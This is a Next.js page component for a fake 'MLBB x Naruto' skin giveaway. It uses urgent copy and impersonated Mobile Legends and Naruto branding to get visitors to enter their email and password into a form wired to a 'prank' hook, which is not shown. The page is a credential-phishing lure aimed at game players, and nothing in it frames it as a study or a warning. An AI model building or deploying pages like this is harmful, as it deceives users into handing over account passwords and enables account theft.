"use client"; // This directive makes it a Client Component

import Head from "next/head"; // Still useful for setting page title
import Image from "next/image"; // Let's use this for some flair!
import { usePrankForm } from "@/app/hooks/usePrankForm"; // Assuming alias for hooks
import { PrankFormComponent } from "@/app/components/PrankForm"; // Assuming alias for components

export default function ClaimPage() {
  const {
    email,
    setEmail,
    password,
    setPassword,
    isLoading,
    error,
    handleSubmit,
  } = usePrankForm();

  return (
    <>
      <Head>
        <title>🔥 MLBB x Naruto: EPIC SKIN EVENT! Claim Yours NOW! 🔥</title>
        <meta
          name="description"
          content="Don't miss out! Log in to claim your FREE & EXCLUSIVE Naruto Series Skins for Mobile Legends - Limited Time Only!"
        />
      </Head>
      {/* Main container with a more dynamic gradient background */}
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-orange-700 flex flex-col items-center justify-center p-4 text-white selection:bg-orange-500 selection:text-white">
        {/* Event Card */}
        <div className="bg-slate-800/[0.8] backdrop-blur-md p-6 md:p-8 rounded-xl shadow-2xl shadow-orange-500/30 w-full max-w-lg border border-orange-500/50 transform transition-all hover:shadow-orange-400/50 hover:scale-[1.02]">
          {/* Header Section */}
          <div className="text-center mb-6 md:mb-8">
            <div className="flex justify-center items-center space-x-4 mb-4">
              <Image
                src="https://placehold.co/100x100/FFFFFF/000000/png?text=MLBB+Logo&font=roboto" // Replace with actual MLBB logo
                alt="Mobile Legends Logo"
                width={60}
                height={60}
                className="rounded-full"
              />
              <span className="text-4xl font-bold text-yellow-400">X</span>
              <Image
                src="https://placehold.co/100x100/FF9900/FFFFFF/png?text=Naruto+Logo&font=ninja" // Replace with actual Naruto logo
                alt="Naruto Logo"
                width={60}
                height={60}
                className="rounded-md"
              />
            </div>
            <h1 className="text-3xl md:text-4xl font-bold mb-2">
              <span className="bg-clip-text text-transparent bg-gradient-to-r from-orange-400 to-yellow-400">
                ULTIMATE SKIN GIVEAWAY!
              </span>
            </h1>
            <p className="text-lg md:text-xl text-slate-300">
              Log in to snag your{" "}
              <span className="font-bold text-yellow-400">LEGENDARY</span>{" "}
              Naruto Skins!
            </p>
          </div>

          {/* Form Component */}
          <PrankFormComponent
            email={email}
            onEmailChange={setEmail} // Changed from onEmailChange for consistency with typical prop naming
            password={password}
            onPasswordChange={setPassword} // Changed from onPasswordChange
            isLoading={isLoading}
            error={error}
            onSubmit={handleSubmit}
          />

          {/* Footer Text */}
          <p className="mt-8 text-xs text-center text-slate-400 animate-pulse">
            ⚠️ <span className="font-semibold">LIMITED SPOTS!</span> This epic
            event won't last forever. Claim your skins before they're gone! ⚠️
          </p>
        </div>
      </div>
    </>
  );
}
